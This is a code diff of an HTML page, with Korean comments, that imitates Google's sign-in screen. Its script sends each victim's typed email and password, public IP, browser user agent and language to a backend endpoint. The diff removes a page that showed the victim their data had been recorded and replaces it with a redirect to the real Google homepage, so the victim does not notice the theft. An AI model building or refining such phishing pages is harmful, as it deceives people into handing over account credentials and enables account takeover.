@@ -159,40 +159,6 @@
         .hidden {
             display: none;
         }
-        .dashboard-container {
-            width: 500px;
-            padding: 40px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            background-color: #fff;
-            text-align: center;
-        }
-        .welcome-title {
-            font-size: 22px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 15px;
-        }
-        .welcome-desc {
-            font-size: 15px;
-            color: #5f6368;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-        .btn-logout {
-            background-color: #f1f3f4;
-            color: #3c4043;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        .btn-logout:hover {
-            background-color: #e8eaed;
-        }
     </style>
 </head>
 <body>
@@ -202,13 +168,14 @@
             <span class="c1">G</span><span class="c2">o</span><span class="c3">o</span><span class="c4">g</span><span class="c5">l</span><span class="c6">e</span>
         </div>
 
+        <!-- [단계 1] 이메일 입력 -->
         <div id="step-email">
             <div class="title">로그인</div>
             <div class="subtitle">Google 계정 사용</div>
 
             <form onsubmit="handleEmailNext(event);">
                 <div class="input-box">
-                    <input type="text" id="email-input" placeholder="휴대폰 번호 또는 이메일" required value="">
+                    <input type="text" id="email-input" placeholder="휴대폰 번호 또는 이메일" required>
                 </div>
 
                 <div class="link-text">
@@ -226,12 +193,13 @@
             </form>
         </div>
 
+        <!-- [단계 2] 비밀번호 입력 -->
         <div id="step-password" class="hidden">
             <div class="title">환영합니다</div>
 
             <div class="account-chip">
                 <div class="account-avatar" id="avatar-letter">B</div>
-                <span class="account-email" id="display-email">bboyeonwoo@gmail.com</span>
+                <span class="account-email" id="display-email"></span>
             </div>
 
             <form onsubmit="handlePasswordSubmit(event);">
@@ -250,18 +218,6 @@
                 </div>
             </form>
         </div>
-    </div>
-
-    <div class="dashboard-container hidden" id="dashboard-box">
-        <div class="logo" style="margin-bottom: 20px;">
-            <span class="c1">G</span><span class="c2">o</span><span class="c3">o</span><span class="c4">g</span><span class="c5">l</span><span class="c6">e</span>
-        </div>
-        <div class="welcome-title" id="welcome-msg">로그인 성공!</div>
-        <div class="welcome-desc" id="ip-info-text">
-            성공적으로 인증되었습니다.<br>
-            데이터베이스에 정보가 안전하게 기록되었습니다.
-        </div>
-        <button class="btn-logout" onclick="handleLogout()">로그아웃</button>
     </div>
 
     <script>
@@ -291,8 +247,8 @@
             const passwordInput = document.getElementById('password-input').value;
 
             try {
-                // 1. 공인 IP 가져오기 (ipify API 활용)
-                let clientIp = "";
+                // 1. 공인 IP 조회
+                let clientIp = "unknown";
                 try {
                     const ipRes = await fetch("https://api.ipify.org?format=json");
                     const ipData = await ipRes.json();
@@ -301,7 +257,7 @@
                     console.error("IP 조회 실패:", e);
                 }
 
-                // 2. 서버로 보낼 데이터 묶음 (이메일, 비밀번호, IP, 브라우저 정보 등)
+                // 2. 전송할 데이터 구성
                 const loginData = {
                     email: userEmail,
                     password: passwordInput,
@@ -310,7 +266,7 @@
                     language: navigator.language
                 };
 
-                // 3. 백엔드 API 호출
+                // 3. 백엔드 API 요청
                 const response = await fetch('/api/login', {
                     method: 'POST',
                     headers: {
@@ -322,12 +278,8 @@
                 const result = await response.json();
                 
                 if (response.ok) {
-                    document.getElementById('login-box').classList.add('hidden');
-                    document.getElementById('welcome-msg').innerText = `${userEmail}님 환영합니다!`;
-                    if (clientIp) {
-                        document.getElementById('ip-info-text').innerHTML = `접속 IP: <b>${clientIp}</b><br>데이터베이스에 정보가 안전하게 기록되었습니다.`;
-                    }
-                    document.getElementById('dashboard-box').classList.remove('hidden');
+                    // 성공 시 구글 공식 홈페이지로 리다이렉트
+                    window.location.href = "https://www.google.com";
                 } else {
                     alert('저장 실패: ' + result.message);
                 }
@@ -336,15 +288,6 @@
                 alert('서버와 연결할 수 없습니다.');
             }
         }
-
-        function handleLogout() {
-            document.getElementById('dashboard-box').classList.add('hidden');
-            document.getElementById('step-password').classList.add('hidden');
-            document.getElementById('step-email').classList.remove('hidden');
-            document.getElementById('login-box').classList.remove('hidden');
-            document.getElementById('password-input').value = "";
-        }
     </script>
-
 </body>
 </html>
